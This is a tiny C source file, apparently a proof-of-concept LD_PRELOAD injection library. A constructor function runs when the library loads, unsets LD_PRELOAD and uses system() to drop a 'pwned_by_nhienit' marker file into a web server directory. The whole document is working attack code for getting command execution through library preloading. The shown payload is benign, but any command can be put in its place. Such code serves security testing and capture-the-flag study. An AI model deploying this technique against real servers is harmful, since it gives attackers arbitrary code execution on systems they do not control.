#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void nhienit(void)
{
    unsetenv("LD_PRELOAD");
    system("echo 123 > /var/www/html/ld_preload/pwned_by_nhienit");
}